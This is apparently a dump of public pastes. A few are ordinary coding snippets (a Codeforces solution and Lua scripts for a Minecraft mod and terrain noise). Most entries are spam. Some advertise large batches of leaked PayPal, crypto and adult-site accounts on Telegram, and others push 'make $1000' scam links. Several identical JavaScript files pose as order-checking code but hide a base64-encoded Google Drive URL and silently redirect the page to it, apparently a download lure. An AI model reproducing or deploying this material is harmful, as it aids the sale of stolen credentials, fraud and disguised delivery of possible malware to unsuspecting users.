id,title,username,language,date,content
J9mP3DsG,PayPal with Balance,navrajkhunger,JavaScript,Monday 28th of April 2025 12:25:15 PM CDT,48102 Accounts Posted On https://t.me/leakedbyem1nem
1GT6gWAY,Products.js,WassupDog45,JavaScript,Monday 28th of April 2025 12:23:41 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/21707/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
6xJA0584,EARN $900 INSTANTLY 2025 95,jkfyueygfjuybebteqwy,JavaScript,Monday 28th of April 2025 12:17:54 PM CDT," 
Pdf https://tinyurl.com/freshleaks

oKxLCleMMe
"
Jj8JTbxH,CF2104E AC,pb_jiang,C++,Monday 28th of April 2025 12:15:47 PM CDT,"// Problem: E. Unpleasant Strings
// Contest: Codeforces - Educational Codeforces Round 178 (Rated for Div. 2)
// URL: https://codeforces.com/contest/2104/problem/E
// Memory Limit: 512 MB
// Time Limit: 2000 ms
//
// Powered by CP Editor (https://cpeditor.org)

#include <assert.h>
#include <bits/stdc++.h>
using namespace std;
#ifndef __DEBUG__
#define dbg(...) 42
#endif
template <class T> using mpq = priority_queue<T, vector<T>, greater<T>>;

namespace rngs = std::ranges;
using ll = long long;
using a2l = array<ll, 2>;
using pll = pair<ll, ll>;
using vl = vector<ll>;

ll n, k, q;
string s;
vector<vl> ids;
vl cache;

void solve()
{
    string al;
    cin >> al;

    ll st = -1;
    for (auto c : al) {
        auto id = c - 'a';
        const auto &iv = ids[id];
        auto nit = upper_bound(iv.begin(), iv.end(), st);
        if (nit == iv.end()) {
            cout << 0 << '\n';
            return;
        }
        st = *nit;
    }

    // cache_output(st);
    cout << cache[st] + 1 << '\n';
}

int main(int argc, char **argv)
{
    std::ios::sync_with_stdio(false);
    std::cin.tie(nullptr);
    cin >> n >> k >> s >> q;
    ids.resize(k);

    for (ll i = 0; i < n; ++i) {
        auto id = s[i] - 'a';
        ids[id].push_back(i);
    }

    cache = vl(n + 1, -1);
    cache[n] = 0;
    for (ll i = n - 1; i >= 0; --i) {
        ll min_op = LLONG_MAX;
        for (ll id = 0; id < k; ++id) {
            const auto &iv = ids[id];
            auto nid = upper_bound(iv.begin(), iv.end(), i);
            if (nid == iv.end()) {
                min_op = 0;
                break;
            }
            min_op = min(min_op, cache[*nid] + 1);
        }
        cache[i] = min_op;
    }

    for (ll i = 0; i < q; ++i)
        solve();

    return 0;
};
"
Tt90g8x6,ae2-crafting-monitor,DubSlime,Lua,Monday 28th of April 2025 12:11:32 PM CDT,"-- AE2 Crafting Monitor with Tabs (Crafting & Storage Recap)
-- Displays Crafting CPUs status, item progress, storage recap, and more

-- FIND peripherals
local monitor = peripheral.find(""monitor"")
local me = peripheral.find(""meBridge"")

if not monitor then error(""No monitor connected!"") end
if not me then error(""No ME Bridge connected!"") end

-- SETTINGS
monitor.setTextScale(0.5)
local w, h = monitor.getSize()
local perPage = math.floor((h - 4) / 6) -- adjusted for header/footer
local pageCrafting = 1  -- Pagination for Crafting tab
local pageStorage = 1   -- Pagination for Storage tab
local blinkState = true -- for blinking
local activeTab = ""crafting"" -- Default tab

-- UTILS
local function centerText(mon, text, y, textColor, bgColor)
    local x = math.floor((w - #text) / 2) + 1
    mon.setCursorPos(x, y)
    mon.setTextColor(textColor or colors.white)
    mon.setBackgroundColor(bgColor or colors.black)
    mon.write(text)
end

local function drawBlock(x1, y1, x2, y2, bgColor)
    monitor.setBackgroundColor(bgColor)
    for y = y1, y2 do
        monitor.setCursorPos(x1, y)
        monitor.write(string.rep("" "", x2 - x1 + 1))
    end
end

local function drawProgressBar(x, y, width, active, progress)
    monitor.setCursorPos(x, y)
    if active then
        monitor.setBackgroundColor(colors.green)
        monitor.write(string.rep("" "", math.floor(progress * width)))
        monitor.setBackgroundColor(colors.gray)
        monitor.write(string.rep("" "", width - math.floor(progress * width)))
    else
        monitor.setBackgroundColor(colors.gray)
        monitor.write(string.rep("" "", width))
    end
end

local function drawButton(x1, x2, label, selected)
    monitor.setBackgroundColor(selected and colors.lightBlue or colors.gray)
    local mid = math.floor((x1 + x2) / 2) - math.floor(#label/2)
    monitor.setCursorPos(mid, h)
    monitor.setTextColor(colors.black)
    monitor.write(label)
end

-- TAB System
local function drawTabs()
    local tabWidth = math.floor(w / 2)
    -- Crafting Tab
    drawBlock(1, 1, tabWidth, 2, activeTab == ""crafting"" and colors.blue or colors.gray)
    centerText(monitor, ""Crafting"", 1, colors.white, activeTab == ""crafting"" and colors.blue or colors.gray)
    
    -- Storage Tab
    drawBlock(tabWidth + 1, 1, w, 2, activeTab == ""storage"" and colors.blue or colors.gray)
    centerText(monitor, ""Storage"", 1, colors.white, activeTab == ""storage"" and colors.blue or colors.gray)
end

-- MAIN GUI: Crafting Tab
local function drawCraftingTab()
    monitor.setCursorPos(1, 3)
    monitor.setTextColor(colors.white)
    monitor.setBackgroundColor(colors.black)
    centerText(monitor, ""Crafting Jobs"", 3, colors.white, colors.black)

    -- Fetch CPUs
    local cpus = me.getCraftingCPUs() or {}
    local totalPages = math.max(1, math.ceil(#cpus / perPage))
    pageCrafting = math.min(pageCrafting, totalPages)

    -- Draw CPUs and Jobs
    local startIdx = (pageCrafting - 1) * perPage + 1
    local endIdx = math.min(#cpus, startIdx + perPage - 1)

    local y = 4
    for idx = startIdx, endIdx do
        local cpu = cpus[idx]
        if cpu then
            local active = cpu.isBusy
            local name = cpu.name or (""CPU #"" .. idx)
            if name == """" then name = ""Unnamed CPU"" end

            -- Background block (blink color if busy)
            local bgColor = active and (blinkState and colors.blue or colors.lightBlue) or colors.gray
            drawBlock(2, y, w-1, y+4, bgColor)

            -- Display CPU name
            monitor.setCursorPos(4, y+1)
            monitor.setTextColor(colors.white)
            monitor.setBackgroundColor(bgColor)
            monitor.write(name:sub(1, w-8))

            -- Display Status
            monitor.setCursorPos(4, y+2)
            monitor.write(active and ""Status: Busy"" or ""Status: Idle"")

            -- If the CPU is busy, show the item being crafted (placeholder message)
            if active then
                local craftingItem = ""Item being crafted..."" -- Placeholder as AE2 doesn't expose this directly
                monitor.setCursorPos(4, y+3)
                monitor.write(""Crafting: "" .. craftingItem)

                -- Progress bar (mocked progress)
                local progress = 0.5 -- Mocked progress (50%)
                local remainingTime = ""5 minutes"" -- Mocked remaining time
                monitor.setCursorPos(4, y+4)
                drawProgressBar(4, y+4, w-8, active, progress)
                monitor.setCursorPos(w-7, y+4)
                monitor.setTextColor(colors.yellow)
                monitor.write(remainingTime)
            else
                -- No job running, show Idle message
                monitor.setCursorPos(4, y+3)
                monitor.write(""No active job"")
            end
        end
        y = y + 7
    end

    -- Pagination Footer (for Crafting tab)
    drawBlock(1, h, w, h, colors.gray)
    if pageCrafting > 1 then
        drawButton(1, math.floor(w/2)-1, ""< Prev"", false)
    else
        drawButton(1, math.floor(w/2)-1, ""< Prev"", true)
    end
    if pageCrafting < totalPages then
        drawButton(math.floor(w/2)+1, w, ""Next >"", false)
    else
        drawButton(math.floor(w/2)+1, w, ""Next >"", true)
    end
    centerText(monitor, ""Page ""..pageCrafting..""/""..totalPages, h-1, colors.black, colors.gray)
end

-- MAIN GUI: Storage Recap Tab
local function drawStorageTab()
    monitor.setCursorPos(1, 3)
    monitor.setTextColor(colors.white)
    monitor.setBackgroundColor(colors.black)
    centerText(monitor, ""Storage Recap"", 3, colors.white, colors.black)

    -- Get AE2 Storage Information (corrected method)
    local storage = me.getItems() or {}
    local totalItems = 0
    local totalUsed = 0
    local totalCapacity = 0

    -- Calculate total used space and capacity
    for _, item in ipairs(storage) do
        totalItems = totalItems + 1
        totalUsed = totalUsed + item.qty
        totalCapacity = totalCapacity + item.capacity
    end

    local usedPercentage = totalCapacity > 0 and math.floor((totalUsed / totalCapacity) * 100) or 0

    -- Display Storage Recap
    monitor.setCursorPos(4, 5)
    monitor.write(""Total Items: "" .. totalItems)

    monitor.setCursorPos(4, 6)
    monitor.write(""Used: "" .. totalUsed .. ""/"" .. totalCapacity .. "" ("" .. usedPercentage .. ""%)"")

    -- Show each item in storage
    local y = 7
    for _, item in ipairs(storage) do
        monitor.setCursorPos(4, y)
        monitor.write(item.name .. "": "" .. item.qty)
        y = y + 1
        if y > h - 3 then break end
    end

    -- Pagination Footer (for Storage Recap tab)
    drawBlock(1, h, w, h, colors.gray)
    if pageStorage > 1 then
        drawButton(1, math.floor(w/2)-1, ""< Prev"", false)
    else
        drawButton(1, math.floor(w/2)-1, ""< Prev"", true)
    end
    if pageStorage < math.ceil(#storage / perPage) then
        drawButton(math.floor(w/2)+1, w, ""Next >"", false)
    else
        drawButton(math.floor(w/2)+1, w, ""Next >"", true)
    end
    centerText(monitor, ""Page ""..pageStorage..""/""..math.ceil(#storage / perPage), h-1, colors.black, colors.gray)
end

-- Touch Handler
local function handleTouch(x, y)
    if y == h then
        if x < w/2 then
            activeTab = ""crafting""  -- Switch to Crafting Tab
            pageCrafting = 1  -- Reset Crafting pagination
        else
            activeTab = ""storage""   -- Switch to Storage Tab
            pageStorage = 1   -- Reset Storage pagination
        end
    elseif y > h - 3 then
        if activeTab == ""crafting"" then
            if x < w/2 and pageCrafting > 1 then
                pageCrafting = pageCrafting - 1
            elseif x >= w/2 and pageCrafting < math.ceil(#(me.getCraftingCPUs() or {}) / perPage) then
                pageCrafting = pageCrafting + 1
            end
        elseif activeTab == ""storage"" then
            if x < w/2 and pageStorage > 1 then
                pageStorage = pageStorage - 1
            elseif x >= w/2 and pageStorage < math.ceil(#(me.getItems() or {}) / perPage) then
                pageStorage = pageStorage + 1
            end
        end
    end
end

-- Main Loop
parallel.waitForAny(
    function()
        while true do
            drawTabs()
            if activeTab == ""crafting"" then
                drawCraftingTab()
            elseif activeTab == ""storage"" then
                drawStorageTab()
            end
            sleep(1)
        end
    end,
    function()
        while true do
            local event, pX, pY = os.pullEvent(""monitor_touch"")
            handleTouch(pX, pY)
        end
    end
)
"
YSm38cED,Leaked Accounts - Fresh Hits,navrajkhunger,JavaScript,Monday 28th of April 2025 12:09:53 PM CDT,96964 Accounts Posted On https://t.me/leakedbyem1nem
BRdg2PS6,Make $1000 15-MINUTES (BEGINNER) L4,jkfyueygfjuybebteqwy,JavaScript,Monday 28th of April 2025 12:08:40 PM CDT," 
Pdf https://tinyurl.com/freshleaks

KpSfHhJrHt
"
iA5ms70F,Order.js,WassupDog45,JavaScript,Monday 28th of April 2025 12:08:15 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/14438/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
6Pi8qLk3,Chaturbate with Tokens,navrajkhunger,JavaScript,Monday 28th of April 2025 11:54:31 AM CDT,13811 Accounts Posted On https://t.me/leakedbyem1nem
MBHrEWJg,Market.js,WassupDog45,JavaScript,Monday 28th of April 2025 11:52:54 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/92045/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
sBGfLR51,Crypto Accounts,navrajkhunger,JavaScript,Monday 28th of April 2025 11:39:08 AM CDT,82510 Accounts Posted On https://t.me/leakedbyem1nem
t8fPNihy,Untitled,WassupDog45,JavaScript,Monday 28th of April 2025 11:37:32 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/93930/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
1ECc5gaS,PayPal with Balance,navrajkhunger,JavaScript,Monday 28th of April 2025 11:23:46 AM CDT,46699 Accounts Posted On https://t.me/leakedbyem1nem
M8KaKnfB,Products.js,WassupDog45,JavaScript,Monday 28th of April 2025 11:22:09 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/97171/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
h5bEYVRA,Leaked Accounts - Fresh Hits,navrajkhunger,JavaScript,Monday 28th of April 2025 11:08:24 AM CDT,04679 Accounts Posted On https://t.me/leakedbyem1nem
aqtv9NFZ,Order.js,WassupDog45,JavaScript,Monday 28th of April 2025 11:06:48 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/19663/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
S9f0YZqB,Chaturbate with Tokens,navrajkhunger,JavaScript,Monday 28th of April 2025 10:53:02 AM CDT,20210 Accounts Posted On https://t.me/leakedbyem1nem
qx0e85n1,Untitled,kirkarr,Lua,Monday 28th of April 2025 10:52:05 AM CDT,"local function makeNoise(seed)
    -- Перемешиваем массив p на основе seed
    local p = {}
    for i = 0, 255 do
        p[i + 1] = i
    end
    -- Fisher-Yates shuffle
    math.randomseed(seed)
    for i = 256, 2, -1 do
        local j = math.random(1, i)
        p[i], p[j] = p[j], p[i]
    end
    -- Дублируем для упрощения вычислений
    for i = 0, 255 do
        p[256 + i + 1] = p[i + 1]
    end

    -- Вспомогательные функции
    local function lerp(a, b, t)
        return a + (b - a) * t
    end

    local function fade(t)
        return t * t * t * (t * (t * 6 - 15) + 10)
    end

    local function grad(hash, x, y, z)
        local h = hash % 16
        local u = h < 8 and x or y
        local v = h < 4 and y or (h == 12 or h == 14) and x or z
        return ((h % 2) == 0 and u or -u) + ((h % 3) == 0 and v or -v)
    end

    -- Основная функция шума
    return function(x, y, z)
        y = y or 0
        z = z or 0

        local X = math.floor(x) % 256
        local Y = math.floor(y) % 256
        local Z = math.floor(z) % 256

        x = x - math.floor(x)
        y = y - math.floor(y)
        z = z - math.floor(z)

        local u = fade(x)
        local v = fade(y)
        local w = fade(z)

        local A  = p[X + 1] + Y
        local AA = p[A + 1] + Z
        local AB = p[A + 2] + Z
        local B  = p[X + 2] + Y
        local BA = p[B + 1] + Z
        local BB = p[B + 2] + Z

        return lerp(
            lerp(
                lerp(grad(p[AA + 1], x, y, z), grad(p[BA + 1], x - 1, y, z), u),
                lerp(grad(p[AB + 1], x, y - 1, z), grad(p[BB + 1], x - 1, y - 1, z), u),
                v
            ),
            lerp(
                lerp(grad(p[AA + 2], x, y, z - 1), grad(p[BA + 2], x - 1, y, z - 1), u),
                lerp(grad(p[AB + 2], x, y - 1, z - 1), grad(p[BB + 2], x - 1, y - 1, z - 1), u),
                v
            ),
            w
        )
    end
end

function makeTerrainGenerator(seed)
    local noise = makeNoise(seed)

    -- Мультиоктавный шум для более естественного рельефа
    local function fractalNoise(x, z, octaves, persistence)
        local total = 0
        local frequency = 1
        local amplitude = 1
        local maxValue = 0

        for i = 1, octaves do
            total = total + noise(x * frequency, z * frequency) * amplitude
            maxValue = maxValue + amplitude
            amplitude = amplitude * persistence
            frequency = frequency * 2
        end

        return total / maxValue
    end

    -- Основная функция генерации высоты
    return function(x, z)
        -- Базовый шум (крупные формы рельефа)
        local baseNoise = fractalNoise(x / 100, z / 100, 4, 0.5) * 64

        -- Детализация (холмы, неровности)
        local detailNoise = fractalNoise(x / 20, z / 20, 2, 0.3) * 10

        -- Эрозия (сглаживание)
        local erosion = fractalNoise(x / 50, z / 50, 2, 0.4) * 5

        -- Итоговая высота
        local height = baseNoise + detailNoise - erosion

        -- Ограничиваем диапазон (например, от 50 до 120)
        height = math.max(50, math.min(120, height))

        return math.floor(height)
    end
end"
DhUEbBng,Market.js,WassupDog45,JavaScript,Monday 28th of April 2025 10:51:26 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/54065/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
MtnZuYJF,Crypto Accounts,navrajkhunger,JavaScript,Monday 28th of April 2025 10:37:40 AM CDT,28692 Accounts Posted On https://t.me/leakedbyem1nem
ssGaaSmg,Untitled,WassupDog45,JavaScript,Monday 28th of April 2025 10:36:04 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/65606/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
